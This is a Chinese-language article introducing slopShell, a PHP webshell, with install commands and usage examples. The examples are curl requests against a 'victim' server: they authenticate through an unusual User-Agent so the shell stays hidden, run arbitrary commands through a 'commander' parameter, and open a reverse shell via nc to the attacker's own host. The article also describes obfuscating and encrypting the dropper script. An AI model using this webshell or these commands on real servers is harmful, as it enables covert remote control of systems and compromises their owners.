@@ -1,0 +1,47 @@
+<attachment contenteditable="false" data-atts="%5B%5D" data-aid=".atts-6c6f9e9b-f3e3-427e-b606-45279858d595"></attachment><p>slopShell是一款功能强大的PHP Webshell，有了它，你就不需要再用到其他Webshell了。</p><p>为了让这个shell正常工作，广大研究人员只需要做两件事情，一是能够将php文件发送给目标用户，二是能够向这个Webshell发送HTTP请求</p><p><br></p><h2>工具演示视频</h2><p>视频地址：【<a href="https://www.youtube.com/watch?v=FywNszpfDJo" target="_blank" style="color: rgb(39, 116, 201);">点我观看</a>】</p><p><br></p><h2>工具安装</h2><p>首先，广大研究人员需要运行一台由自己控制的pgsql服务器，然后根据自己的操作系统类型选择对应的安装命令：</p><h3>Debian</h3><pre class="ql-syntax" spellcheck="false">apt install -y postgresql php php-pear &amp;&amp; python -m pip install proxybroker --user
+</pre><h3>RHEL系统</h3><pre class="ql-syntax" spellcheck="false">dnf -y -b install postgresql-server postgresql php php-pear &amp;&amp; python -m pip install proxybroker --user
+</pre><p>一旦这些设置正确并且可以确认它们正在运行，我建议广大研究人员运行命令“pg_ctl”来创建数据库，并实现数据库的初始化和启动，以此确保所有数据库查询都可以正常工作。</p><h2>工具交互</h2><p>首先，您需要选择一个有效的User-Agent来使用，你可以把它看成是第一层保护，以防您的webshell被除您之外的任何人意外地发现。我这里选择的是“sp/1.1”，因为它是一个非典型的User-Agent。如果设置不当的话，可能会导致渗透测试过程中出现问题，或者导致脚本和访问请求被屏蔽。对于Windows版本的话，我没有添加过多内容，因为本人不太喜欢Windows开发。</p><p>下面给出的是如何将此webshell与curl一起使用的示例：</p><pre class="ql-syntax" spellcheck="false">curl https://victim/slop.php?qs=cqP -H "User-Agent: sp/1.1" -v
+</pre><p>或者，执行下列自定义命令：</p><pre class="ql-syntax" spellcheck="false">curl https://victim/slop.php --data "commander=id" -H "User-Agent: sp/1.1" -v
+</pre><p>或者，可以尝试跟你自己的设备建立一个反向Shell：</p><pre class="ql-syntax" spellcheck="false">curl https://victim/slop.php --data "rcom=1&amp;mthd=nc&amp;rhost=&amp;rport=&amp;shell=sh" -H "User-Agent: sp/1.1" -v
+</pre><h2>工具使用样例</h2><p>在浏览器中，在不使用正常User-Agent字符串的情况下发送请求（第一层认证）：</p><p><img src="https://image.3001.net/images/20210602/1622643702_60b793f60965f030ee4c6.jpeg!small" height="248" width="690"></p><p>在命令行终端窗口中，使用curl命令以及-vH "User-Agent: sp1.1"选项执行：</p><p><img src="https://image.3001.net/images/20210602/1622643707_60b793fb0f8e4e919f8e4.jpeg!small" height="541" width="690"></p><p>经过混淆处理后的脚本示例：</p><p><img src="https://image.3001.net/images/20210602/1622643712_60b79400cf22c3cb93199.png!small" height="254" width="690"></p><p>生成混淆后的脚本：</p><p><img src="https://image.3001.net/images/20210602/1622643718_60b794065a3dbd2076f47.png!small" height="259" width="690"></p><h2>数据加密</h2><p>当加密程序运行完之后，Dropper脚本将会被加密，并且经过高度混淆处理，样本输出如下：</p><pre class="ql-syntax" spellcheck="false">Base64 decoded: also a test 123
+
+Re-Encoded: YWxzbyBhIHRlc3QgMTIz
+
+Key: 4212bd1ff1d366f23ca77021706a9a29cb824b45f82ae312bcf220de68c76760289f1d5550aa341002f1cfa9831e871e
+
+Key Length: 96
+
+Encryption Result:
+
+Array
+
+(
+
+&nbsp;&nbsp;&nbsp;&nbsp;[original] =&gt; also a test 123
+
+&nbsp;&nbsp;&nbsp;&nbsp;[key] =&gt; 4212bd1ff1d366f23ca77021706a9a29cb824b45f82ae312bcf220de68c76760289f1d5550aa341002f1cfa9831e871e
+
+&nbsp;&nbsp;&nbsp;&nbsp;[encrypted] =&gt; meIHs/y6_U7U~7(M
+
+&nbsp;&nbsp;&nbsp;&nbsp;[base64_Encoded] =&gt; bWVJSAAdcw4veTZfVQU3VX43KE0=
+
+)
+
+Decrypt Test:
+
+Array
+
+(
+
+&nbsp;&nbsp;&nbsp;&nbsp;[key] =&gt; 4212bd1ff1d366f23ca77021706a9a29cb824b45f82ae312bcf220de68c76760289f1d5550aa341002f1cfa9831e871e
+
+&nbsp;&nbsp;&nbsp;&nbsp;[encrypted] =&gt; meIHs/y6_U7U~7(M
+
+&nbsp;&nbsp;&nbsp;&nbsp;[decrypted] =&gt; YWxzbyBhIHRlc3QgMTIz
+
+&nbsp;&nbsp;&nbsp;&nbsp;[base64_decoded] =&gt; also a test 123
+
+&nbsp;&nbsp;&nbsp;&nbsp;[original] =&gt; also a test 123
+
+)
+</pre><h2>项目地址</h2><p><strong>slopShell：</strong>【<a href="https://github.com/oldkingcone/slopShell" target="_blank" style="color: rgb(39, 116, 201);">GitHub传送门</a>】</p><p><br></p>
